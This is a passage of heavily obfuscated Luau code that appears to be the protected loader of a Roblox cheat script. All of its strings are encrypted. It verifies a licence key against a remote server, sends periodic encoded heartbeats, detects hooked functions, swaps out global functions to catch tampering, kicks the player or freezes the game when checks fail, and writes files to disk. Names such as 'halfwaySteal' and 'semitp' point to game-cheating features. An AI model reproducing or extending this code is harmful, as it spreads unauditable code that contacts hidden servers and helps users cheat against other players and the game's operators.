	for i = 1, 2 do
		local n9 = arg % 9915 + 4
		local n10 = nil
		local n11 = nil

		for i2 = 1, 3 do
			n10 = arg % 4155 + 3

			if i2 % 2 == 1 then
				n10 += 522
			end

			n11 = arg % 9996 + 1

			if n11 % 2 ~= 1 then
				n11 *= 3
			end
		end

		local n12 = arg % 9999995 + 1 + 5623
		local n13 = arg % 1000
		local n14 = fn3((arg - n13) / 1000) % 1000
		local n15 = arg % (n9 * n10 + 9999) + 5623
		arg = (n13 * n14 + n12 + arg % (419824125 - n12 + n13) + (n15 + n13 * n10 + n14) % 999999 * (n12 + n15 % n11)) % 99999999999
	end

	return arg
end

local function fn14()
end

local function fn15(arg)
	local tbl11 = {}
	local tbl12 = {}
	local tbl13 = {}

	for i = 1, 13 do
		local tbl14 = {}
		local tbl15 = {}
		tbl11[tbl14] = tbl15
		tbl12[tbl15] = i
		tbl13[tbl14] = tbl15
	end

	if arg then
		tbl12 = arg[2]
		tbl13 = arg[3]
		tbl11 = arg[1]
	end

	local n9 = 0
	local n10 = 0
	local n11 = 0

	for k, v61 in v11, tbl11, nil do
		local v62 = tbl12[v61]

		if tbl13[k] == v61 then
			n9 += 1
		end

		n10 += 1
		n11 = n10 % 2 == 0 and n11 * v62 or n11 + v62 + n10
	end

	if n9 ~= 13 then
		n6 = -1
	end

	tbl8 = { tbl11, tbl12, tbl13 }
	n6 = n11
	return false
end

local function fn16(arg)
	for i = 1, 2 do
		local n9 = arg % 9915 + 4
		local n10 = nil
		local n11 = nil

		for i2 = 1, 3 do
			n10 = arg % 4155 + 3

			if i2 % 2 == 1 then
				n10 += 522
			end

			n11 = arg % 9996 + 1

			if n11 % 2 ~= 1 then
				n11 *= 3
			end
		end

		local n12 = arg % 9999995 + 1 + 5623
		local n13 = arg % 1000
		local n14 = fn3((arg - n13) / 1000) % 1000
		local n15 = arg % (n9 * n10 + 9999) + 5623
		arg = (n13 * n14 + n12 + arg % (419824125 - n12 + n13) + (n15 + n13 * n10 + n14) % 999999 * (n12 + n15 % n11)) % 99999999999
	end

	return arg
end

local function fn17(arg)
	for i = 1, 2 do
		local n9 = arg % 9915 + 4
		local n10 = nil
		local n11 = nil

		for i2 = 1, 3 do
			n10 = arg % 4155 + 3

			if i2 % 2 == 1 then
				n10 += 522
			end

			n11 = arg % 9996 + 1

			if n11 % 2 ~= 1 then
				n11 *= 3
			end
		end

		local n12 = arg % 9999995 + 1 + 5623
		local n13 = arg % 1000
		local n14 = fn3((arg - n13) / 1000) % 1000
		local n15 = arg % (n9 * n10 + 9999) + 5623
		arg = (n13 * n14 + n12 + arg % (419824125 - n12 + n13) + (n15 + n13 * n10 + n14) % 999999 * (n12 + n15 % n11)) % 99999999999
	end

	return arg
end

local function fn18(arg)
	local n9 = 1103515245
	local n10 = 12345
	local n11 = 99999999
	local n12 = arg % 2147483648
	local n13 = 1

	return function(arg2, arg3)
		local v61 = n11
		local n14 = n9 * n12 + n10
		local n15 = n14 % v61 + n13
		n13 += 1
		n12 = n15
		n10 = n14 % 4859 * v61 % 5781
		return arg2 + n15 % arg3 - arg2 + 1
	end
end

local n9 = 68
fn14(67, v3[fn2("\132", 3840891719161)], v3[fn2("\148\243v\159\160\235\254v\22\198&3\183[\220h\254qŎJ\25\208K\154\157\246]", 12721007603271)])
n6 = -1
fn15()

while n6 == -1 do
end

local v61 = fn18(n7 + n6)

if n8 == 9 or n8 == 15 then
	local n10 = 0

	v15(function()
		local function fn19(arg)
			v32(arg[1])
		end

		fn19(v19({}, { [v3[fn2("\216K\237\155\22XS", 643190981207)]] = function()
			local fn20 = nil

			fn20 = function()
				n10 += 1
				return fn20()
			end

			fn20()
		end }))
	end)

	local n11 = 0

	v15(function()
		v44(v19({}, { [v3[fn2("\192\ra\139\231\195\12", 32549329237609)]] = function()
			local fn19 = nil

			fn19 = function()
				n11 += 1
				return fn19()
			end

			fn19()
		end }))
	end)

	if n11 + n10 < 20000 then
		n9 = 19
	elseif n11 - n10 ~= 0 then
		n9 = 189
	end
end

local function fn19(arg, arg2, arg3)
	local v62 = v3
	local tbl11 = { [v3[fn2("\242~\242\192\31\156", 25253030878174)]] = v62[fn2("rs\254", 30562846240559)] }

	if arg2 then
		tbl11 = v19(tbl11, { [v3[fn2("\216\21m\142\201m\185", 4427172646939)]] = function(arg4, arg5)
			if arg5 == v3[fn2("6c\17", 29393505708782)] then
				local v63 = v3
				local v64 = v16(v17(), v63[fn2("\1639\5\144\26ǈu&/\184", 32746903762721)])
				local v65 = v64()
				local v66 = v64()
				local n10 = 1

				v15(function()
					n10 = v18(v66) - v18(v65)
				end)

				if (n8 == 9 or n8 == 15) and (n10 ~= 0 or v65 ~= v66) then
					n9 = 121

					while arg3 do
					end
				end

				return arg
			end

			return v20(tbl11, arg5)
		end })
	else
		tbl11[v3[fn2("\226\245\174", 16547940252723)]] = arg
	end

	local v63 = v44(tbl11)

	if v63[v3[fn2("\133\\*\136\211ɹ\206\215j", 13445805453546)]] == 0 then
		if flag8 then
			warn(v3[fn2("j-F\128\162\139WIʯ\\хE\181p6\159O\23).O\193\218E\30\243&\217Kӛí\1735IR#\26^v\17v\242\243\255g*6c-;/\14\158\130\159~\212\193\22715fo,7\169D\202L\n\165ە\136@\152\181\146hn\208OCDt\158", 18739514197036)])
		end

		local v64 = v3
		writefile(v3[fn2("\207\249D\240\136>\28\137\129dÐ\214\30\184\231\139\226\150\24\179", 17214754274976)], v64[fn2("\216xc\22ѧ\29\211\253\25&\168\165\162\239_rגm*\250\8\190C\229\197ڊ\1792y\193\3|\21\198)$\183\28\14\127\167}\137 H\206\220J\198tݪ\165/\129\29`$'\176\252{v\185j\163M\160\tCEi\4\196z\255]\n\16zx\167\254\\W\168\181", 24541118323015)])
	end

	return v63[v3[fn2("2\224o\143", 15183172745020)]], v63[v3[fn2("\235\144\243\23326\138", 30737871499218)]]
end

fn8()

local function fn20(arg)
	if v35()[8753563] == 22044 and n8 ~= 11 then
		if flag8 then
			warn(v3[fn2("MI\186Vb\245\221\195>\219۔\228\197\2258:\228<d\249\232\25\157|\139\228q\18寋k\17\11\202\232\154l|\190\2325\144\15\240-\210\234\162\6\158\183\227\237j\165\205W\1\145\189Q\241\233\238&\23\156/\205L꜊\255\134)\132!\19ԃ\248\15\241J6\188bM\137\152j\172\139jO6ԫ\170e3\19049\2101\188e7\226\5\246\137\193só(\247h\169\n\217\231l\142\234%\157lnJ\151`=\136\24\16\219\31\156\161\185Ȧ\t\241\127:\175\225#UWz6D\168<\245\186.ph\195ǂȊ#ĶM\214\26y\246\29\ns\218z\185\"\180Q\23411xM\178\27\162\190\26\148B", 15193910490950)])
		end

		v27(function()
			v21(5)
			v35()[8753563] = nil
		end)

		fn9()
	end

	v35()[8753563] = 22044
	local flag11 = false
	local tbl11 = { v22, v19, v32 }

	tbl11[-1] = n8 == 3 and function()
	end or v44

	local v62 = v26
	local v63 = v25
	local v64 = v24
	local v65 = v23
	local v66 = v15
	tbl11[4] = v12
	tbl11[5] = v62
	tbl11[6] = v63
	tbl11[7] = v64
	tbl11[8] = v65
	tbl11[9] = v66

	local function fn21()
		flag11 = true
		return v3[fn2("9", 805330944750)]:rep(16777215)
	end

	local v67 = v19({}, { [v3[fn2("\2\164\245C\127\213\\\162\31N", 24089059219362)]] = function()
		flag11 = true
		return v3[fn2("\n", 12700605886004)]:rep(16777215)
	end })

	for k, v68 in v11, tbl11, nil do
		if k ~= -1 then
			local flag12 = n8 ~= 11

			if flag12 then
				local v69 = v3
				flag12 = v22(v68)[v69[fn2("\183\167\19\142", 33365397928289)]] == v3[fn2("\11h\3", 1198332445788)]
			end

			if flag12 then
				flag11 = true
			end
		end

		if v68 ~= v10 and v68 ~= v32 then
			local v69 = v10
			local v70 = v32
			local v71 = error
			local env = getfenv()
			env[v3[fn2("*\253\137\5\172\129[\220", 22630873322068)]] = fn21
			env[v3[fn2("d0\166\143,", 17147106475617)]] = fn21
			env[v3[fn2("\194\218Gp<", 22071436759115)]] = fn21

			if k == -1 then
				if n8 ~= 5 then
					v15(v68, v3[fn2("", 22141232107660)])
				end
			else
				v15(v68, v67)
			end

			env[v3[fn2("\236\169g\\\154\181>2", 19030507111739)]] = v70
			env[v3[fn2("OH\r\168\171", 146033344648)]] = v69
			env[v3[fn2("n9\171U\136", 23510294713735)]] = v71
		end
	end

	if flag11 and n8 ~= 11 then
		n9 = 85

		if arg then
			fn9(true)
		end
	end

	v35()[8753563] = nil
end

local v62 = n7
local v63 = nil
local flag11 = nil
local exitTo = nil

while true do
	local v64 = v15(function()
		local v64 = fn19
		local v65 = v3
		v63 = v64(tbl5[v3[fn2("vx\194#", 12421424491824)]] .. v65[fn2("[O\242\0037\14\186", 5635169064064)], n8 == 9 or n8 == 15)
		local data = v14:GetService(v3[fn2("\14\162\t\231\29\182*\207)\183p", 24734397749755)]):JSONDecode(v63)

		if not data[v3[fn2(",b@\180%\197", 21709574721274)]] then
			warn(data[v3[fn2("#\144\1440\177J_", 15555772528791)]])
			fn9()
		end

		if not data[v3[fn2("'G\8\177li2\202", 6353524266781)]][tbl5[v3[fn2("\\\1927b`\19\180", 2717723494883)]]] then
			warn(v3[fn2("\170\225Ӥ\6t=\31\209\\\128W\254\215\219\217\208\249\214K,\170JOUZ\243o\144F\180\1443|\169+E\162\5\197\239\173\243y\2088$\250\24/7\4q)", 10233071871290)])
			fn9()
		end

		tbl5[v3[fn2("M<\173\140", 25338932845614)]] = flag4 and LT_R_RRT_H or v7 and v3[fn2("U՜\142s`Q\20;\18\198p\167-\154\139]\156\225\206\u{F45E}\2072:\0", 13360977260699)] or v3[fn2("\194\219Κ\2251\176\229", 20587480271589)] .. v6
		local v66 = tbl5
		local v67 = v3
		v9 = data[v3[fn2("\147\208\226r\29\14\12\29", 29417128749828)]][v66[v67[fn2("\234]\254\157\27yP", 25466712022181)]]]
	end)

	fn8()

	if not v64 then
		if not flag11 then
			fn14(69, v3[fn2("\132", 5187405058783)], v3[fn2("z\144\199zz\217\30\184 .t\4\248Hc\184\169BB\254G\191\5\223\237t\220i", 2506189900062)])
			v6 = v3[fn2("\185\153\142\14\4\0Q\15~a\234\8\243\250\128\"\185\152v\229Y\160\205Mĸ~", 25562277960958)]
			tbl5[v3[fn2("ѝ\175\188", 12563162738100)]] = flag4 and LT_R_RRT_H or v3[fn2("\137q\219σ\146\245\230B)\11%\rè~\188\254\151Q\214En1?\194h\197p\202>\191\128\188\166", 19243114481153)]
			flag11 = true

			if v64 then
				exitTo = 1
				break
			else
				continue
			end
		end

		break
	elseif v64 then
		exitTo = 1
		break
	end
end

if exitTo ~= 1 then
	fn14(100, v3[fn2("n\218\192\176\129w\151\190\193\1756", 21845944094585)], v3[fn2("-\209 \r\161\128\30\181)\162\169\194\240\156\19Ȣs\0212\188p\207(\188\240\176\157\230\2\142\167\11\226\159&\233", 10693721171687)] .. v32(v63), Color3[v3[fn2("\211\207k", 18772801209419)]](1, 0, 0), v3[fn2(" `\4\162\157", 18561267614598)])
	return
end

local function fn21(arg)
	local n10 = 1103515245
	local n11 = 12345
	local n12 = 99999999
	local n13 = arg % 2147483648
	local n14 = 1

	return function(arg2, arg3)
		local v64 = n12
		local n15 = n10 * n13 + n11
		local n16 = n15 % v64 + n14
		n14 += 1
		n13 = n16
		n11 = n15 % 4859 * v64 % 5781
		return arg2 + n16 % arg3 - arg2 + 1
	end
end

local flag12 = false

v27(function()
	if not v15(function()
		local v64 = tbl9
		local new = v64.new
		local v65 = flag4 and LT_R_RRT_W
		local str2

		if v65 then
			str2 = v65
		else
			local v66 = v7

			if v7 then
				local v67 = v6
				local v68 = v3
				str2 = v3[fn2("\183b\225(\6", 22124051714172)] .. v67 .. v68[fn2("0Mz'W!\18\31\179uwA\241", 2211975661580)]
			else
				str2 = v66
			end
		end

		if not str2 then
			local v66 = v6
			local v67 = v3
			str2 = v3[fn2("\146?\180M\218\\", 11448584710566)] .. v66 .. v67[fn2("S\1344\0225\167y%\153\151\160p\17F", 6916182153513)]
		end

		flag6 = new(v64, str2)
	end) then
		local v64 = v3
		fn14(75, v3[fn2("$", 1674014590487)], v64[fn2("\3ER\150\169\174/D\168\171\182\25\\\129i\223kg\5\21\233\248\2127\249՞\184\27\144\31\179\180xO\159\127݀*\28\194TT\189\145\233z\n", 9788529189788)])
		flag6 = false
	end

	flag12 = true
end)

local n10 = n7 % 8585 * v62 % 9910
fn20()

if flag5 then
	n9 = 146
end

fn14(85, v3[fn2("\164", 31753662264196)], v3[fn2("e\249\24\25\161 \251\8\2081\171\141\127Q:\247V\12\157\2432\28\237a\225", 6450163980151)])
local v64 = fn21(n10 + v61(2, 4096))
local v65 = v61(1111, 32768)
local n11 = 12000 + ((1398563873 * ((1398563873 * (1361 + n10 + n6 % 1000 + n6) % 1610612736 + 22491) % 95716599 + 1) + 22491) % 95716599 + 1) % 120000 - 12000 + 1
local tbl11 = { n11 + v64(100000, 1000000), v65, n11 + v61(3333, 15625) + n7, (v64(10000, 1000000)) }
n6 = -1
fn15()
local flag13 = false

if n6 == -1 then
	n6 = 100
	flag13 = true
end

local n12 = 0
local n13 = 0
local n14 = 0
local n15 = 1
local tbl12 = { [0] = 0 }

local function fn22(arg, arg2, arg3)
	arg2 = arg2 and arg or tbl6[arg]

	if not arg3 then
		arg2 = (arg2 + 4096 - tbl12[n12]) % 256
		n14 += arg2
		n12 = (n12 + 1) % n15
	end

	local n16 = arg2 % 16
	return tbl7[(arg2 - n16) / 16] .. tbl7[n16]
end

local function fn23(arg)
	local n16 = 0

	for i = 1, #arg do
		n16 += v25(arg, i)
	end

	return n16
end

local function fn24(arg, arg2)
	local v66 = tbl7
	local n16 = (tbl7[v26(arg, 1, 1)] * 16 + v66[v26(arg, 2, 2)] + tbl12[n13]) % 256
	n13 = (n13 + 1) % n15
	if arg2 then
		return n16
	end
	return tbl6[n16]
end

local function fn25(arg)
	local tbl13 = {}
	n13 = 0
	local n16 = 1

	while true do
		local v66 = fn24(v26(arg, n16, n16 + 1), true)
		n16 += 2
		local v67 = v3[fn2("", 13613314290054)]

		for i = 1, v66 do
			v67 ..= fn24(v26(arg, n16, n16 + 1))
			n16 += 2
		end

		tbl13[#tbl13 + 1] = v67
		if not (n16 > #arg) then
			continue
		end
		break
	end

	return tbl13
end

local function fn26(arg, arg2)
	local v66 = fn22(#arg, true, arg2)

	for i = 1, #arg do
		v66 ..= fn22(v26(arg, i, i), false, arg2)
	end

	return v66
end

local function fn27(arg, arg2, arg3)
	if arg == 1 then
		tbl12 = arg2
		n15 = arg3
	elseif arg == 2 then
		n12 = 0
		n14 = 0
	elseif arg == 3 then
		return n14
	end
end

local v66 = fn18(v61(2, 32768 + v24() % 2000) + n6 % 4096)
local v67 = fn12(v64(1, 32768) + n7 + v24() % 1000)
local v68 = v66(111111, 999999)
local tbl13 = {}

for i = 1, v68 % 30 + 1 do
	local fn28

	if i == 2 then
		fn28 = v32
	elseif i == 8 then
		fn28 = v10
	elseif i == 17 then
		fn28 = v26
	else
		fn28 = function()
		end
	end

	tbl13[i] = fn28
end

local n16 = v67(111111, 999999) + 17715
local n17 = v66(1, 1234) * v67(2, 1235) + n6 % 80000
local n18 = 10000 + ((1445613873 * ((1445613873 * (n11 + n6) % 1627389952 + 23515) % 94716599 + 1) + 23515) % 94716599 + 1) % 100000 - 10000 + 1
local tbl14 = { n18 + v66(100000, 1000000), n18 + v67(100000, 1000000), (v66(100000, 1000000)) }

if v4 or v5 then
	n9 = 218
end

if flag13 then
	n9 = 250
end

local v69 = tbl14[1]
local n19 = 7376 + tbl11[4]
local str2 = (((fn26(v3[fn2("", 26309625077686)] .. n16) .. fn26(v3[fn2("", 16740145904870)] .. fn16(10886 + v68) .. fn13(n9 + n17) .. fn10(n16 - 17715))) .. fn26(n17 .. v3[fn2("", 17472460177296)]) .. fn26(v3[fn2("", 27987934766545)] .. v68)) .. fn26(tbl11[3] + 10418 .. v3[fn2("", 13603650318717)])) .. fn26(v3[fn2("", 32880051812253)] .. v69) .. fn26(v3[fn2("", 16629547121791)] .. n19)
local n20 = tbl11[2] + 17715
local str3 = str2 .. fn26(tbl14[3] .. v3[fn2("", 13202058620935)]) .. fn26(v3[fn2("", 15144516859672)] .. n20)
local n21 = 10886 + tbl11[1]
local str4 = (str3 .. fn26(tbl14[2] .. v3[fn2("", 18783538955349)]) .. fn26(v3[fn2("", 8523622719234)] .. n21)) .. fn26(str or v3[fn2("\15", 2953953905343)])
local str5 = fn26(fn17(fn27(3) + 16885) .. v3[fn2("", 3140790684525)], true) .. str4
local tbl15 = {}
local v70 = v67(111111, 999999)
local v71 = n6
getfenv()[tbl15] = v70
local v72, v73 = fn19(tbl5[v3[fn2("\209\30p\238", 17011810876899)]] .. v3[fn2("V", 25199342148524)] .. v9 .. v3[fn2("\221\209\n=o\17", 1184373376079)] .. tbl5[v3[fn2("p<\196O\205\0158s", 21268253363551)]] .. v3[fn2("c>\6\3F\162+y", 3976187317879)] .. str5 .. v3[fn2("\167Q\174", 1858703820483)] .. tbl5[v3[fn2("\15s )\130R\2366K\160\146G\162", 33488882006484)]] .. v3[fn2("\142\229\173", 8988567118003)] .. v43, n8 == 9 or n8 == 15)
n6 = -1
fn15(tbl8)

while n6 == -1 do
end

while tbl11[2] ~= v65 do
end

local n22 = 0

for k, v74 in v33(tbl13) do
	if k == 2 and v74 ~= v32 then
		n9 = 147
	end

	if k == 8 and v74 ~= v10 then
		n9 = 147
	end

	if k == 17 and v74 ~= v26 then
		n9 = 147
	end

	n22 = k
end

if n22 ~= v68 % 30 + 1 then
	n9 = 147
end

local flag14 = false

if n9 == 147 then
	flag14 = true
end

if n6 ~= v71 then
	n9 = 100
	flag14 = true
end

if v72 == v3[fn2("\196\205X", 28147927180902)] then
	while true do
	end
else
	local fn28, n23, v74, n24, n25, v75, tbl16, n26, n27, n28

	do
		if v34(v72, v3[fn2("\166\222ʞ\1593\166ye\241v\251\148W\162\200<\128\148(ݯ\180\233/p\147\233F襣\136\185\170\1\172\250\235\173k", 1377652802819)]) then
			if v8 then
				v8(v3[fn2("Ҕ~E\164", 19446057879230)])
				return
			end
		end

		if v26(v72, 1, 1) == v3[fn2("\138", 5914350458244)] then
			local v76 = v3[fn2("l\24\178\25+\175\tY\29B갖X\23", 28383083816769)]
			local v77

			if string[v3[fn2("\220eg'", 2761748253196)]](v72, v3[fn2("\23GB\147\212y\236\24\167&\219\243@y;\217", 9639274521361)]) then
				v76 = v3[fn2("LY\1333\11w\134\174FP\194 \4\177,y7\5y", 15260484515716)]
				v77 = v26(v72, 2, #v72 - 17)
			else
				v77 = v26(v72, 2, #v72)
			end

			fn14(100, v3[fn2("\244\159\237\201L\217X\239\180\245$\181G?", 30952626417818)], v3[fn2("N=1MT {!\211Z\191R\207'\140\200\253|3\169\178\183\150U\25c", 27278169760572)], Color3[v3[fn2("\189o`", 30263263129112)]](1, 0, 0), v3[fn2("4\226\14\232\14", 13170919157738)])
			fn4(v76, v77)
			fn9()
		end

		if v73 then
			if not v73[v3[fn2("\2\209\252\2074\186vTX\135", 27265284465456)]] then
				local v76 = v73[v3[fn2("\212/tO\130\27\16ĩ\177", 17419845222239)]]
			end
		end

		local n29 = tbl11[4] % 256
		local tbl17 = { [0] = tbl11[1] % 256, tbl11[2] % 256, tbl11[3] % 256, n29 }
		fn8()

		fn28 = function(arg)
			local n30 = 1103515245
			local n31 = 12345
			local n32 = 99999999
			local n33 = arg % 2147483648
			local n34 = 1

			return function(arg2, arg3)
				local v76 = n32
				local n35 = n30 * n33 + n31
				local n36 = n35 % v76 + n34
				n34 += 1
				n33 = n36
				n31 = n35 % 4859 * v76 % 5781
				return arg2 + n36 % arg3 - arg2 + 1
			end
		end

		if getfenv()[tbl15] ~= v70 then
			n9 = 100
			flag14 = true
		end

		n23 = 1

		for i = 1, 30 do
			local v76 = v32({})
			local n30

			if v32({}) < v76 then
				n30 = n23 + 1
			else
				n30 = n23 * 2
			end

			n23 = n30 % 10000
		end

		fn27(1, tbl17, 4)
		v74 = fn25(v72)
		n24 = v74[1] - n16
		n25 = v74[4] - v68

		while n29 ~= tbl17[3] do
		end

		fn20()
		v75 = tbl17[3]

		tbl16 = {
			[0] = tbl17[0],
			[2] = tbl17[1],
			[4] = tbl17[2],
			[6] = v75,
			v74[9],
			[3] = v74[7],
			[5] = v74[2],
			[7] = v74[6],
		}

		fn27(1, tbl16, 8)
		n26 = v74[8] - tbl14[1]
		n27 = v74[3] - tbl14[2]
		n28 = v74[5] - tbl14[3]
		local str6 = v3[fn2("", 28654748788798)] .. fn17(tbl14[3] + 2199) .. fn16(tbl14[1] + 31) .. fn13(tbl14[2] + 4802)

		if v74[11] == str6 and ({ [str6] = true })[v74[11]] then
			flag2 = true
		else
			local str7 = v3[fn2("", 6334196324107)] .. fn10(tbl14[3] + 2199) .. fn13(tbl14[1] + 69) .. fn16(tbl14[2] + 4802)

			if v74[11] == str7 and ({ [str7] = true })[v74[11]] then
				flag2 = true
			end
		end
	end

	if flag2 then
		local flag15 = v18(v74[14] and v74[14] or v3[fn2("\230v", 11362682743126)]) == -1
		v18(v74[15] and v74[15] or v3[fn2("\8", 1527981245839)])
	end

	n6 = -1
	fn15()

	if n6 == -1 then
		n9 = 250
		n6 = 100
	end

	local n29 = n7 + v66(111111, 999999) + v67(1234, 5678) + n6 % 99915 + n23
	tbl14[4] = n7 + n6 % 9951
	v66(100000, 1000000 + n6 % 1000)
	tbl14[5] = n6 % 8005 + n23 + v67(100000, 1000000 + n6 % 5000)
	tbl14[6] = v66(100000, 1000000)
	fn27(2)
	local v76 = v74[10]
	local v77 = tbl14[6]
	local str6 = fn26(v3[fn2("", 11551667071494)] .. fn13(v74[13] + 9341) .. fn17(n29 + n9) .. fn16(v74[10] + v68)) .. fn26(tbl14[5] .. v3[fn2("", 33512505047530)]) .. fn26(v3[fn2("", 24280191096916)] .. n29) .. fn26(v3[fn2("", 281328943366)] .. v77) .. fn26(tbl14[4] .. v3[fn2("", 30946183770260)])
	local str7 = fn26(fn13(fn27(3) + 16885) .. v3[fn2("", 1284234413228)], true) .. str6
	local v78 = v74[12]
	local response = v14:HttpGet(tbl5[v3[fn2("\204=\165,", 285624041738)]] .. v3[fn2("\215", 34962100748080)] .. v9 .. v3[fn2("\180T}\144E`\233N0\18\159\197", 5342028600175)] .. v78 .. v3[fn2("l4\190", 13551035363660)] .. str7)

	while v75 ~= tbl16[6] do
	end

	if response == v3[fn2("-\n+", 31841711780822)] then
		while true do
		end
	else
		if v26(response, 1, 1) == v3[fn2("\231", 5502021014532)] then
			v14:GetService(v3[fn2("<\165\18]\1795\142", 2067016091525)])[v3[fn2("\135\2218q\250\240\249wOź", 21595754614416)]]:Kick(response)
			fn9()
		end

		do
			local v79 = fn25(response)
			local n30 = 1
			local v80 = fn28(1 + v66(100, 1000 + n23) + v67(500, 5000 + n23) + n7 % 10000)
			local flag15 = false
			local n31 = 0
			local flag16 = false
			local flag17 = false
			local v81 = nil

			for i = 1, 3 do
				local v82 = v79[3]
				local str8 = fn13(tbl14[5] + 17715) .. fn13(tbl14[4] + fn23(flag16 and v3[fn2("\177", 34008588909496)] or v14[v3[fn2("\5fw\137\244", 33146347911317)]])) .. fn13(tbl14[6] + tbl14[2])

				if v82 == str8 and ({ [str8] = true })[v82] then
					flag3 = true

					if not (v79[8] and v79[8] ~= v3[fn2("C", 5343102374768)] and v79[8]) then
						local v83 = v3[fn2("x\138\221<\173~N", 31676350493500)]
					end

					if not (v79[9] and v79[9]) then
						local v83 = v3[fn2("\190;h\148\252\0\245", 23283728274612)]
					end

					v81 = v79[6]

					do
						local n32 = v79[1] - tbl14[4]
						local n33 = v79[7] - tbl14[5]
						local n34 = v79[5] - tbl14[6]
						local v83 = n26
						local v84 = n27
						local v85 = n28

						n26 = function(arg)
							if not (flag15 or n31 < v29() - 8) then
								n30 = (n30 + arg % 66) % 6644
								return v83 * arg % n32 + arg * 3
							end

							while true do
							end
						end

						n27 = function(arg)
							if not (flag15 or n31 < v29() - 8) then
								n30 = (n30 + arg % 50) % 5891
								return v84 * arg % 10000 + arg * n33 % 4
							end

							while true do
							end
						end

						n28 = function(arg)
							if not (flag15 or n31 < v29() - 8) then
								n30 = (n30 + arg % 35) % 6711
								return (arg + n34) % 100 * arg % (v85 % 100 + 1)
							end

							while true do
							end
						end
					end

					flag17 = true
					break
				elseif i == 3 then
					flag17 = false
					v81 = nil
				else
					flag16 = true
					flag17 = false
					v81 = nil
				end
			end

			if not flag17 then
				while true do
				end
			else
				if not flag14 then
					local v82, Players, service, RunService, TweenService, UserInputService, CoreGui, service2, TeleportService, service3
					local localPlayer, playerGui, fn29, v83, tbl17, fn30, fn31, fn32, fn33, fn34
					local fn35, tbl18, fn36, fn37, fn38, semitp, selectedSlot, tbl19, fn39, fn40
					local halfwaySteal, fn41, fn42, fn43, fn44, fn45, fn46, fn47, v84, screenGui
					local createUIStroke, createUICorner, fn48, hudWidth, hudHeight, n32, n33, instance, n34, frame

					do
						local fn49, createUIGradient

						do
							do
								do
									local HttpService

									do
										do
											while not flag12 do
												v28:Wait()
											end

											flag7 = true

											do
												local flag18 = false
												local flag19 = false
												local n35 = 0
												local n36 = 0
												local n37 = 0
												local flag20 = false
												local n38 = 0
												local n39 = 0
												local v85 = v74[12]

												v27(function()
													flag19 = true

													while not flag9 do
														local n40 = v80(1000, n30 + 10000) + n30
														local n41 = v80(1000, n30 + 10000) + n30
														n38 = n40
														n39 = n41
														fn27(2)
														local v86 = fn26
														local str8 = fn26(n39 .. v3[fn2("", 15363566876644)]) .. v86(fn17(n39 + v76) .. v3[fn2("", 6862493423863)] .. fn16(n38 + n16)) .. fn26(n38 .. v3[fn2("", 13612240515461)])
														local v87 = v3[fn2("", 26792823644536)]
														local v88 = v9
														local v89 = v3
														local str9 = tbl5[v3[fn2("\251k\3\137", 8239072452089)]] .. v3[fn2("\243", 6554320115672)] .. v88 .. v3[fn2("\1716y\6\132\215\1\133#\18\21'\12\146H\155\195\17", 8461343792840)] .. str8 .. v89[fn2("\224\212\238", 27556277380159)] .. v85

														v15(function()
															if flag8 then
																local v90 = v3
																v30(v3[fn2("@", 8025391308082)] .. v29() .. v3[fn2("\198\5\158\149\150H\31\14\31\12\163}g\158\31H\4\5\208[", 21377778372037)] .. v32(flag6) .. v90[fn2("\229\215", 957806936956)])
															end

															if flag6 == false then
																v87 = fn19(str9)
															else
																v87 = flag6:request({ [v3[fn2("E\143\147", 17306025115381)]] = str9 })
															end

															if flag8 then
																local v90 = v3
																v30(v3[fn2("\136", 8205785439706)] .. v29() .. v90[fn2("\20N\188+\204\18\227\131`OM\249P=\163n\206\2432", 6507074033580)])
															end

															if v87 and #v87 > 3 then
																if v87 == v3[fn2(",.[\"@+o>\223", 19626452010854)] then
																	flag15 = true
																	flag2 = false
																	flag3 = false
																	n25 = 1
																	n24 = 2
																	local v90 = v3
																	v14:GetService(v3[fn2("K\26\21\0193\18\164", 34803182108316)])[v90[fn2("\210\201\222Q\159{D\181\180\253d", 29684498623485)]]:Kick(v3[fn2("\3\174d\163\173\15\196\248\n\148\211g\189\226M\252,\146?T\145^m\161\29J\31mM\158n\1\176D\232\133\t\2291r*\138W\145\0190\29\152I\176\177\147X^3\153O۴", 33049708197947)])
																	fn9()
																end

																if v87 == v3[fn2("Ɖ\162J", 30249304059403)] then
																	flag15 = true
																	flag2 = false
																	flag3 = false
																	n25 = 1
																	n24 = 2
																	local v90 = v3
																	writefile(v3[fn2("\231\151|(\168\248]\170\254\215\233V\231k\136M\172\129\168", 14824532030958)], v90[fn2("s25z\154\234a\131\145", 15250820544379)])

																	while true do
																	end
																else
																	v87 = fn25(v87)[1]

																	if v87 == fn13(n38 * n39 % 100000 + n29 + 10886) .. v3[fn2("", 28489387501476)] then
																		n36 += 1
																		flag20 = true
																		flag18 = true
																	elseif v87 == fn10(n38 * n39 % 100000 + n29 + 10886 + 4919) .. v3[fn2("", 15233640150891)] then
																		flag20 = true
																		flag18 = true
																		flag9 = true

																		v15(function()
																			flag6:close()
																		end)
																	else
																		flag15 = true
																		flag2 = false
																		flag3 = false
																		n25 = 1
																		n24 = 2
																		local v90 = v3
																		v14:GetService(v3[fn2("\197>x\169\18fL", 29485850323780)])[v90[fn2("\172\15\203V*\147lM\179R\26", 24838553885276)]]:Kick(v3[fn2("\174\191bRRQ*\193ع'\25\154\n\158j\6\129\242\184\187\21\21D\245\225tL\179\160(", 22159486275741)] .. n36)
																	end
																end
															end
														end)

														v21(20)
													end
												end)

												while not flag19 do
													v28:Wait()
												end

												flag19 = false

												v27(function()
													flag19 = true
													local n40 = 200

													while true do
														n40 += 1

														if not flag9 and n40 >= 250 then
															if flag20 then
																n35 += 1

																if n35 > 4 then
																	n35 = 0

																	if n37 < 10 then
																		n37 += 1
																	end
																end
															else
																n37 -= 1

																if n37 <= 0 then
																	flag15 = true
																	flag2 = false
																	flag3 = false
																	n25 = 1
																	n24 = 2
																	local v86 = n36
																	writefile(v3[fn2("\rq\227Ŗ\196C\12d5\169P\130\23\225R%\162/\160\157", 15647043369196)], v3[fn2("\226\254\178K\216\255Z+Z", 8167129554358)] .. v86 .. v3[fn2("\250\193X\28", 24571184011619)] .. v32(flag6))
																end
															end

															flag20 = false
															n40 = 0
														end

														n31 = v29()
														v21(0.18)
														if n31 ~= v29() then
															continue
														end
														flag15 = true
														flag2 = false
														flag3 = false
														n25 = 1
														n24 = 2
														local v86 = n36
														writefile(v3[fn2("\221aK\192\216\12q\174n\167\"\232\6\199\17:\166y\t=)", 26022927261355)], v3[fn2("\206\224\168?\226v\231\19\29", 709765005973)] .. v86 .. v3[fn2("\169d\175m", 10312531191172)] .. v32(flag6))
													end
												end)

